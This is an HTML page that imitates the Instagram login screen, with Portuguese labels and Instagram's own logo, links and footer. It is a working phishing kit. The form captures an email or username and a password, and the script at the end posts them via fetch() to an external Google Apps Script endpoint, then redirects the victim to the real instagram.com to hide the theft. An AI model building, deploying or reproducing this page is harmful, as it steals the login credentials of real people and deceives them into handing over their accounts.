<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./insta-fav.ico">
    <title>Instagram Login</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>

                <form name="submit-to-google-sheet">
                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
                    <input type="email" name="Email" placeholder="Phone number, username or email " />

                    <label for="password" class="sr-only">Senha</label>
                    <input name="Password" type="password" placeholder="Password" />

                   <a href="https://www.instagram.com/"> <button id="button" >Log in</button></a>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="https://www.facebook.com/login/">Log in with Facebook </a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password? </a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account? </p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app</p>
                <div class="flex justify-content-center">
                    <a href="https://apps.apple.com/us/app/instagram/id389801252"><img  src="./apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" /></a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DE3A849D1-1F69-4673-B95B-9EEDE806FC1A%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"><img src="./googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" /></a>
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://help.instagram.com/">Help</a></li>
            <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
            <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
            <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
            <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
            <li><a href="https://www.threads.net/">Threads</a></li>
            <li><a href="https://about.instagram.com/blog">Blogs</a></li>
            <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Vrified</a></li>
            <li><a href="https://about.meta.com/">Meta</a></li>
            <li><a href="https://about.instagram.com/">about</a></li>
        </ul>
        <p class="copyright">© 2024 Instagram from Meta</p>
    </footer>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwsPHTfvCiCPtW9Blv6ZZvO_jr3QVYO1agI4VfxndUJ62NfJzDpiyL06qsNDe_d6SOkww/exec'
        const form = document.forms['submit-to-google-sheet']
        const button = document.getElementById('button')

        button.addEventListener('click',function(){
            window.location.href = "https://www.instagram.com/"
        })
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => console.log('Success!', response))
            .catch(error => console.error('Error!', error.message))
        })
      </script>
</body>
</html>
